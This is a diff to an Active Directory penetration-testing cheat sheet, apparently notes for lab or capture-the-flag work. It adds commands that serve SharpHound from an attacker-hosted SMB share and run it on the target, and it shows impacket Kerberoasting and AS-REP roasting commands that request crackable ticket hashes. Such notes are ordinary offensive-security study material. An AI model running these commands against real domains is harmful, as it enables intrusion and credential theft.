@@ -1,8 +1,15 @@
 # Active Directory
 
-
-
 ## Bloodhound
+
+```
+impacket-smbserver share . -smb2support -username df -password df
+net use \\10.10.14.9\share /u:df df
+cd \\10.10.14.9\share\
+.\SharpHound.exe
+```
+
+## Bloodhound-Python
 
 {% embed url="https://github.com/fox-it/BloodHound.py" %}
 
@@ -39,4 +46,13 @@ impacket-GetUserSPNs test.local/john:password123 -dc-ip 10.10.10.1 -request
 ```
 impacket-GetNPUsers -no-pass -dc-ip 10.10.10.10 domain.local/ -usersfile users.lst
 impacket-GetNPUsers -no-pass -dc-ip 10.10.10.10 domain.local/ -usersfile users.lst | grep krb5asrep
+```
+
+## Listing directories in PowerShell
+
+```
+Get-ChildItem . -Force
+dir -Force
+ls -Force
+gci -Force
 ```
